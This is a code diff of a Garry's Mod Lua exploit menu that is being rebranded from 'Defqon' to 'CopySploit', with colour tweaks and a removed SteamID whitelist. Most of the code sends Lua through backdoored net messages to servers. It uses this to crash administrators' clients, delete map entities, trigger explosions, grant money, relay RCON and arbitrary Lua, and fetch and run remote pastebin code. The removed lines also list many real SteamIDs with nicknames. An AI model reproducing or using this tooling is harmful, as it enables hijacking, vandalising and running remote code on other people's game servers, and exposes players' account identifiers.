-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменено" )
 net.Start(thefrenchenculer)
-net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked by DefqonSploit\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
-commandnethtx14:SetSize( 208, 20 )
-commandnethtx14:SetPos( 2, 75 )
-commandnethtx14:SetText("Сломать сервер [disco]")
-commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx14.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx14.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
-net.Start(thefrenchenculer)
-net.WriteString( "http.Fetch(\"https://pastebin.com/raw/W529HLVb\",function(b,l,h,c)RunString(b)end,nil)" )
+net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked by CopySploit\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
 net.WriteBit(1)
 net.SendToServer()
 end
@@ -4749,12 +3799,12 @@ commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx15.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx15.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
 net.Start(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
 net.WriteBit(1)
@@ -4768,12 +3818,12 @@ commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx16.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx16.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ах" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ах" )
 net.Start(thefrenchenculer)
 net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
 net.WriteBit(1)
@@ -4787,12 +3837,12 @@ commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx17.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx17.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
 net.Start(thefrenchenculer)
 net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
 net.WriteBit(1)
@@ -4806,12 +3856,12 @@ commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx18.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx18.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
 net.Start(thefrenchenculer)
 net.WriteString( "http.Fetch(\"https://pastebin.com/raw/LH4NW5yc\",RunString)" )
 net.WriteBit(1)
@@ -4825,12 +3875,12 @@ commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx19.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx19.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "-уши" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "-уши" )
 net.Start(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
 net.WriteBit(1)
@@ -4844,12 +3894,12 @@ commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx20.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx20.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 net.Start(thefrenchenculer)
 net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
 net.WriteBit(1)
@@ -4863,12 +3913,12 @@ commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx21.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx21.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
 net.Start(thefrenchenculer)
 net.WriteString([[
     for k,v in pairs(player.GetAll()) do
@@ -4907,12 +3957,12 @@ commandnethtx22:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx22.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx22.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 local armageddon = [[
             hook.Add("Think", "armageddon", function()
                 local explode = ents.Create( "env_explosion" )
@@ -4935,12 +3985,12 @@ commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx23.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx23.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
 local giant = [[
 hook.Add("Think", "giant", function()
     for k,v in pairs (player.GetAll()) do
@@ -4962,12 +4012,12 @@ commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx24.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx24.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
 local tall = [[
 hook.Add("Think", "tall", function()
     for k,v in pairs (player.GetAll()) do
@@ -4989,12 +4039,12 @@ commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx25.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx25.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
 local speedhack = [[
 hook.Add("Think", "speedhack", function()
     for k,v in pairs (player.GetAll()) do
@@ -5015,12 +4065,12 @@ commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx26.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx26.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Кхм" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Кхм" )
 net.Start(thefrenchenculer)
 net.WriteString([[
 for k,v in pairs(player.GetAll()) do
@@ -5042,12 +4092,12 @@ commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx27.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx27.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запущено" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запущено" )
 net.Start(thefrenchenculer)
 net.WriteString( "http.Fetch(\"https://pastebin.com/raw/re1ucyWy\",function(b,l,h,c)RunString(b)end,nil)" )
 net.WriteBit(1)
@@ -5061,7 +4111,7 @@ commandnethtx28:SetTextColor(Color(255, 255, 255, 255))
 commandnethtx28.Paint = function(panel, w, h)
 surface.SetDrawColor(100, 100, 100 ,255)
 surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(50, 0, 0 ,155)
+surface.SetDrawColor(0, 0, 50 ,155)
 surface.DrawRect(0, 0, w, h)
 end
 commandnethtx28.DoClick = function()
@@ -5083,7 +4133,7 @@ end
 local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
 RconCommand:SetPos( 110, 0 )
 RconCommand:SetSize( 100, 20 )
-RconCommand:SetText( "hostname Hacked by DefqonSploit | discord.gg/weJb7TJ" )
+RconCommand:SetText( "hostname Hacked by CopySploit" )
 local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
 Lancer_rcon_commande:SetSize( 103, 20 )
 Lancer_rcon_commande:SetPos( 2, 0 )
@@ -5097,7 +4147,7 @@ surface.DrawRect(0, 0, w, h)
 end
 Lancer_rcon_commande.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
 local rcon_commandes_get = RconCommand:GetValue()
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( rcon_commandes_get )
@@ -5121,7 +4171,7 @@ surface.DrawRect(0, 0, w, h)
 end
 Lancer_glua_commande.DoClick = function()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
 local glua_commandes_get = GLUACommand:GetValue()
 iZNX.NetStart(thefrenchenculer)
 net.WriteString( glua_commandes_get )
@@ -5171,9 +4221,9 @@ iZNX.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )
 iZNX.PlayerSelector:MakePopup()
 iZNX.PlayerSelector.Paint = function( s, w, h )
 if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
-surface.SetDrawColor( Color(30, 30, 30, 245) )
+surface.SetDrawColor( Color(0, 0, 50, 245) )
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color(55, 55, 55, 245) )
+surface.SetDrawColor( Color(50, 50, 90, 245) )
 surface.DrawOutlinedRect( 0, 0, w, h )
 surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
 end
@@ -5259,7 +4309,7 @@ plypanel2:SetSize( 200, 25 )
 local teamcol = team.GetColor( v:Team() )
 plypanel2.Paint = function( s, w, h )
 if !v:IsValid() then return end
-surface.SetDrawColor( Color(30, 30, 30, 245) )
+surface.SetDrawColor( Color(0, 0, 70, 245) )
 surface.DrawRect( 0, 0, w, h )
 surface.SetDrawColor( teamcol )
 surface.DrawRect( 0, h - 3, w, 3 )
@@ -5351,135 +4401,8 @@ end
 hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )
 return hostframe:GetWide(), hostframe:GetTall()
 end
-local FillFrameRates = RatesScaleLevel
-concommand.Add( "Defqon", function()
-if FillFrameRates == "STEAM_0:0:0" -- Одиночная игра (на всякий случай)
-or FillFrameRates == "STEAM_0:0:133570476" -- Dark Louder
-or FillFrameRates == "STEAM_0:0:179576807" -- Leith
-or FillFrameRates == "STEAM_0:1:163307812"
-or FillFrameRates == "STEAM_0:1:86857163"
-or FillFrameRates == "STEAM_0:1:148600355" -- faulif
-or FillFrameRates == "STEAM_0:0:141778910" -- Саня кодер
-or FillFrameRates == "STEAM_0:1:164342539" -- QuaceZero
-or FillFrameRates == "STEAM_0:1:417868808" -- QuaceZero
-or FillFrameRates == "STEAM_0:0:209305097" -- QuaceZero
-or FillFrameRates == "STEAM_0:1:426772203" -- QuaceZeroZ
-or FillFrameRates == "STEAM_0:1:87232089" -- lizardcsgo a.k.a lzrdblzzrd
-or FillFrameRates == "STEAM_0:0:122023682" -- Travka
-or FillFrameRates == "STEAM_0:0:95724304" -- QURS
-or FillFrameRates == "STEAM_0:1:223956472" -- Ermack
-or FillFrameRates == "STEAM_0:0:188571603" -- Ermack
-or FillFrameRates == "STEAM_1:0:169694836" -- KIR
-or FillFrameRates == "STEAM_0:0:169694836" -- KIR
-or FillFrameRates == "STEAM_1:1:169694836" -- KIR
-or FillFrameRates == "STEAM_0:1:169694836" -- KIR
-or FillFrameRates == "STEAM_1:1:123190008" -- KIR
-or FillFrameRates == "STEAM_0:1:123190008" -- KIR
-or FillFrameRates == "STEAM_1:0:123190008" -- KIR
-or FillFrameRates == "STEAM_0:0:123190008" -- KIR
-or FillFrameRates == "STEAM_0:0:91988659" -- Kocmonavtik
-or FillFrameRates == "STEAM_0:1:172637672" -- Megumin
-or FillFrameRates == "STEAM_0:0:78124882" -- Лена
-or FillFrameRates == "STEAM_0:1:184001693" -- я
-or FillFrameRates == "STEAM_1:1:84267153" -- JohnBard
-or FillFrameRates == "STEAM_0:1:84267153" -- JohnBard
-or FillFrameRates == "STEAM_0:0:84267153" -- JohnBard
-or FillFrameRates == "STEAM_0:0:68849843" -- Hason
-or FillFrameRates == "STEAM_1:0:68849843" -- Hason
-or FillFrameRates == "STEAM_0:1:68849843" -- Hason
-or FillFrameRates == "STEAM_0:1:68104527" -- Wsank
-or FillFrameRates == "STEAM_0:0:48628674" -- one touch gamer
-or FillFrameRates == "STEAM_0:0:67003290" -- one touch gamer
-or FillFrameRates == "STEAM_0:0:38886601" -- Moon
-or FillFrameRates == "STEAM_0:1:51961104" -- Lil Peep
-or FillFrameRates == "STEAM_0:0:134073192" -- Tόshâ Bόbürϊn
-or FillFrameRates == "STEAM_0:1:160705047" -- n1ce
-or FillFrameRates == "STEAM_0:1:185806144" -- Gabe
-or FillFrameRates == "STEAM_0:1:83285008" -- Gabe
-or FillFrameRates == "STEAM_0:0:425100967" -- Suip
-or FillFrameRates == "STEAM_0:1:128267449" -- valve
-or FillFrameRates == "STEAM_0:1:80063374"  -- valve
-or FillFrameRates == "STEAM_0:0:98978109" -- Rope
-or FillFrameRates == "STEAM_1:1:82067910" -- EduCool
-or FillFrameRates == "STEAM_1:0:82067910" -- EduCool
-or FillFrameRates == "STEAM_0:1:82067910" -- EduCool
-or FillFrameRates == "STEAM_0:0:64321681" -- Vermin (за помощь в расследовании)
-or FillFrameRates == "STEAM_0:1:96464196"  -- sadless
-or FillFrameRates == "STEAM_0:1:59441932"  -- PanDemiuKcin
-or FillFrameRates == "STEAM_0:0:148433957" -- aloha
-or FillFrameRates == "STEAM_0:1:117441810" -- Saibot
-or FillFrameRates == "STEAM_0:0:64403782"  -- Максим
-or FillFrameRates == "STEAM_0:1:162799229" -- Totito
-or FillFrameRates == "STEAM_0:0:107060867" -- Mircus
-or FillFrameRates == "STEAM_0:0:91077309"  -- FoXy
-or FillFrameRates == "STEAM_0:1:126480121" -- Mafick
-or FillFrameRates == "STEAM_0:1:109987888" -- Goveniy
-or FillFrameRates == "STEAM_0:1:195298319" -- ЕгорБандит
-or FillFrameRates == "STEAM_0:1:60081728"  -- LiGyH
-or FillFrameRates == "STEAM_0:1:40648546"  -- LousyFox
-or FillFrameRates == "STEAM_1:1:420868808" -- HELSTAFF
-or FillFrameRates == "STEAM_0:1:420868808" -- HELSTAFF
-or FillFrameRates == "STEAM_1:0:420868808" -- HELSTAFF
-or FillFrameRates == "STEAM_0:0:420868808" -- HELSTAFF
-or FillFrameRates == "STEAM_0:0:156912424" -- Ruby
-or FillFrameRates == "STEAM_0:1:147609270" -- Niceman
-or FillFrameRates == "STEAM_0:1:106930709" -- Niceman
-or FillFrameRates == "STEAM_0:0:106930709" -- Niceman
-or FillFrameRates == "STEAM_1:1:106930709" -- Niceman
-or FillFrameRates == "STEAM_0:0:106930709" -- Niceman
-or FillFrameRates == "STEAM_0:0:53025026" -- Niceman
-or FillFrameRates == "STEAM_0:1:119416004" -- Numio
-or FillFrameRates == "STEAM_0:0:54631898"  -- Chezzy
-or FillFrameRates == "STEAM_0:1:125198366" -- hason
-or FillFrameRates == "STEAM_0:0:78588335" -- Цыган
-or FillFrameRates == "STEAM_0:1:76365398" -- lord
-or FillFrameRates == "STEAM_0:0:130906952" -- bagi
-or FillFrameRates == "STEAM_0:0:425436001" -- maddog
-or FillFrameRates == "STEAM_0:0:136980892" -- adan
-or FillFrameRates == "STEAM_0:1:429886649" -- Scroller
-or FillFrameRates == "STEAM_0:1:123796452"
-or FillFrameRates == "STEAM_0:0:91988659"
-or FillFrameRates == "STEAM_0:1:97208355"
-or FillFrameRates == "STEAM_0:1:433086746"
-or FillFrameRates == "STEAM_0:0:114759765"
-or FillFrameRates == "STEAM_0:1:99903222"
-or FillFrameRates == "STEAM_0:1:190990405"
-or FillFrameRates == "STEAM_0:0:434743633"
-or FillFrameRates == "STEAM_1:1:223170502"
-or FillFrameRates == "STEAM_1:0:223170502"
-or FillFrameRates == "STEAM_0:1:223170502"
-or FillFrameRates == "STEAM_0:0:223170502"
-or FillFrameRates == "STEAM_0:0:118496131"
-or FillFrameRates == "STEAM_0:1:36913004"
-or FillFrameRates == "STEAM_0:0:111103319" -- ВЕЛИКИЙ!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-or FillFrameRates == "STEAM_0:0:224821474"
-or FillFrameRates == "STEAM_0:0:176251033"
-or FillFrameRates == "STEAM_0:1:122907806" -- english user
-or FillFrameRates == "STEAM_0:0:435948263"
-or FillFrameRates == "STEAM_0:1:436014361"
-or FillFrameRates == "STEAM_0:0:436021942"
-or FillFrameRates == "STEAM_0:0:175846419"
-or FillFrameRates == "STEAM_0:0:146683682"
-or FillFrameRates == "STEAM_0:1:146683682"
-or FillFrameRates == "STEAM_1:0:146683682"
-or FillFrameRates == "STEAM_1:1:146683682"
-or FillFrameRates == "STEAM_0:1:100008351"
-or FillFrameRates == "STEAM_0:0:100008351"
-or FillFrameRates == "STEAM_1:0:100008351"
-or FillFrameRates == "STEAM_0:1:97208355"
-or FillFrameRates == "STEAM_0:0:205920664"
-or FillFrameRates == "STEAM_0:1:433082549"
-or FillFrameRates == "STEAM_0:1:433086746"
-or FillFrameRates == "STEAM_0:0:436021942"
-or FillFrameRates == "STEAM_0:0:435948263"
-or FillFrameRates == "STEAM_0:1:436014361"
-or FillFrameRates == "STEAM_0:1:434629768"
-or FillFrameRates == "STEAM_0:1:116875024"
-or FillFrameRates == "STEAM_0:1:105744181"
-or FillFrameRates == "STEAM_0:1:173519656"
-or FillFrameRates == "STEAM_0:1:215497345"
-or true
-then
+
+concommand.Add( "CopySploit", function()
 LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)
 iZNX.Menu = vgui.Create("DFrame")
 iZNX.Menu:SetSize(950,820)
@@ -5488,16 +4411,16 @@ iZNX.Menu:Center()
 iZNX.Menu:MakePopup()
 iZNX.Menu.gay = table.Count( iZNX.sploits )
 iZNX.Menu.Paint = function( s, w, h )
-surface.SetDrawColor( Color(41, 41, 41) ) -- Цвет обводки внутри меню (41 41 41)
+surface.SetDrawColor( Color(50, 50, 90) ) -- Цвет обводки внутри меню (41 41 41)
 surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color(55, 55, 55, 245) ) -- Обводка меню
+surface.SetDrawColor( Color(50, 50, 90, 245) ) -- Обводка меню
 surface.DrawOutlinedRect( 0, 0, w, h )
 surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
-surface.SetDrawColor( Color(33, 33, 33) ) -- Цвет меню в центре
+surface.SetDrawColor( Color(0, 0, 50) ) -- Цвет меню в центре
 surface.DrawRect( 80, 25, w - 90, h - 35 )
 surface.SetDrawColor( Color(100, 100, 100, 200) )
-draw.DrawText( "Defqon v 5.1.1\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
-draw.DrawText( "17.03.18", "default", 8, 40, Color(255,255,255, 350) )
+draw.DrawText( "CopySploit\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
+draw.DrawText( "09.07.19", "default", 8, 40, Color(255,255,255, 350) )
 draw.DrawText( "---------------","HUDLogo2", 6, 664, Color(255,255,255, 10000) )
 draw.DrawText( "Остальное","HUDLogo2", 5, 652, Color(255,255,255, 10000) )
 draw.DrawText( "---------------","HUDLogo2", 6, 638, Color(255,255,255, 10000) )
@@ -5522,7 +4445,6 @@ iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RainbowGun", rainbowphysgun, "Вк
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "WallHack", WHT, "Включает вх" )
 iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 256, "BunnyHop", Bhop, "Обыкновенный бхоп" )
-iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 283, "Big Menu", bigmenu, "Big Menu" )
 iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 94, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
 local function CreateSploitPanel( name, t )
 if !iZNX.Menu then return end
@@ -5531,7 +4453,7 @@ cmdp:SetSize( Plist:GetWide(), 70 )
 cmdp.Cmd = name
 cmdp.Desc = t.desc
 cmdp.Paint = function( s, w, h )
-surface.SetDrawColor( Color(41, 41, 41, 245) ) -- Цвет эксплойтов
+surface.SetDrawColor( Color(50, 50, 90, 245) ) -- Цвет эксплойтов
 surface.DrawRect( 0, 0, w, h )
 surface.SetDrawColor( severitycols[t.severity] )
 surface.DrawOutlinedRect( 0, 0, w, h )
@@ -5562,71 +4484,7 @@ end
 for k, v in pairs( iZNX.sploits ) do
 if v.scan() then CreateSploitPanel( k, v ) end
 end
-else
-chink = false
-timer.Create("HackersLol", 1, 0, function()
-	if chink then
-		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ты за это не заплатил!" )
-	else
-		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ухади!1!" )
-	end
-	chink = !chink
 end)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-LocalPlayer():EmitSound("common/warning.wav",500,100)
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Чёртов пират, уходи!" )
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), ":^)" )
-RunConsoleCommand( "sdbhfbgf" )
-return end
-end)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -5648,7 +4506,7 @@ else
 chat.AddText( "На этом сервере не установлен ULX" )
 end
 end
-CCA( "Defqon_adduser", lmfao )
+CCA( "CopySploit_adduser", lmfao )
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
@@ -5728,13 +4586,13 @@ concommand.Add( "Music_troll", lmfao1 )
 
 if (_G.QAC or _G.CAC) then
         surface.PlaySound("ambient/alarms/klaxon1.wav")
-        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
